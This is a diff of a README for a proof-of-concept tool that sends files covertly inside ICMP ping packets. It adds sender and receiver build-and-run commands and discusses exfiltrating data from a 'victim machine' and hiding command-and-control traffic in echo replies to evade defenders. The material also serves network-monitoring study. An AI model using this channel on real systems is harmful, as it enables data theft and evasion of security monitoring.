@@ -4,16 +4,26 @@ PoC for transferring files via ICMP Echo Request (alias Ping) packets. Currently
 The discussion below goes into many aspects of this idea which are not implemented here. I may implement some of this stuff sporadically if I end up needing them in practise.
 
 ## Usage
-Currently this is so simple that no makefile is provided.
+This is just a prototype implementation with some - undesirable - properties, but feel free to play around it if you want. It likely will not brick your system, but I wouldn't let it run for hours on end.
+
+### Sender
 ```bash
-# on sender side
-gcc icmput.c -o icmput
+make bin/icmput
+gcc icmput.c -o bin/icmput
 ./icmput -f <filepath> -d <destination Ip or domain>`
 ```
-I have not yet written a receiver software which reassembles the file/data on the receiving end, but you can confirm easily enough that it is working by looking at the network traffic:
+
+### Receiver
 ```bash
-# on receivers side
+# you can check the incoming data e.g. with tcpdump
 tcpdump -X 'icmp6[0]==128' # 128 are ICMP6 echo requests, 129 would be replies
+
+# this repo comes with a prototype receiver which starts writing a new file
+# for every echo request identifier
+# it is based on libpcap and assigns the relevant permissions during make,
+# such that sudo is not required for running the server
+make bin/icmput_server
+./bin/icmput_server
 ```
 
 ## But why?
@@ -46,4 +56,4 @@ But this is just hypothetical. In practise, ICMP Echo Requests have plenty oppor
 Unfortunately, not all of these are available to us if we do not have elevated privileges on the victim machine. If we use sockets of type `SOCK_DGRAM` (works unprivileged) instead of `SOCK_RAW`, the kernel e.g. e.g. might set its own identifier value in the ICMP header. Nevertheless, even if we needed root privileges, the ability to send data via ICMP itself is already pretty neat.
 
 ### C2 via ICMP
-Obfuscation of Command and Control (C2) traffic is nothing new. For example, a common strategy is to issue DNS requests from a victim host and encode the C2 servers reply in the DNS response. This is why many courses teach SoC and Blue Teamers to also have a stern look at DNS traffic (which is mostly port 53 UDP). But C2 via ICMP is even more trivial: Just store whatever your C2 server shall send to the victim in the ICMP Echo Reply.
+Obfuscation of Command and Control (C2) traffic is nothing new. For example, a common strategy is to issue DNS requests from a victim host and encode the C2 servers reply in the DNS response. This is why many courses teach SoC and Blue Teamers to also have a stern look at DNS traffic (which is mostly port 53 UDP). C2 via ICMP is also possible: Just store whatever your C2 server shall send to the victim in the ICMP Echo Reply. This can be fiddly on some server OSes as the kernel very much wants to handle ICMP traffic itself. On Linux you can e.g. control this with `/proc/sys/net/ipv[4|6]/icmp/echo_ignore_all`.
